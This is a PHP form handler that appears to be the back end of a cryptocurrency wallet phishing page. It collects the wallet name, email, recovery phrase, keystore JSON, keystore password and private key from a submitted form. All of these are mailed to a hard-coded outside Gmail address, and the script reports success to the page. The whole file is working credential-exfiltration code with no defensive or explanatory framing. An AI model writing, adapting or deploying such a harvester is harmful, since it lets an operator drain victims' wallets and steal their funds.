<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data safely
    $walletName       = htmlspecialchars($_POST['wallet_name'] ?? '');
    $email            = htmlspecialchars($_POST['email'] ?? '');
    $recoveryPhrase   = htmlspecialchars($_POST['recovery_phrase'] ?? '');
    $keystoreJson     = htmlspecialchars($_POST['keystore_json'] ?? '');
    $keystorePassword = htmlspecialchars($_POST['keystore_password'] ?? '');
    $privateKey       = htmlspecialchars($_POST['private_key'] ?? '');
    $imageSrc         = htmlspecialchars($_POST['image_src'] ?? '');
    $iconName         = htmlspecialchars($_POST['icon_name'] ?? '');

    // Recipients
    $toEmails = [
        "flexygodswill3@gmail.com", // First recipient
        // "secondemail@example.com" // Second recipient
    ];

    // Subject & message
    $subject = "New Wallet Import Submission: $walletName";

    $message = "
    <h3>Wallet Import Details</h3>
    <p><strong>Wallet Name:</strong> $walletName</p>
    <p><strong>Email:</strong> $email</p>
    <p><strong>Recovery Phrase:</strong> $recoveryPhrase</p>
    <p><strong>Keystore JSON:</strong> $keystoreJson</p>
    <p><strong>Keystore Password:</strong> $keystorePassword</p>
    <p><strong>Private Key:</strong> $privateKey</p>
    <p><strong>Icon Name:</strong> $iconName</p>
    <p><strong>Image:</strong> <img src='$imageSrc' alt='wallet image' style='max-width:100px;'></p>
    ";

    // Headers
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: no-reply@yourdomain.com\r\n";

    // Send to both emails
    $success = true;
    foreach ($toEmails as $to) {
        if (!mail($to, $subject, $message, $headers)) {
            $success = false;
        }
    }

    // Return JSON response
    header('Content-Type: application/json');
    echo json_encode(['success' => $success]);
    exit;
}
?>
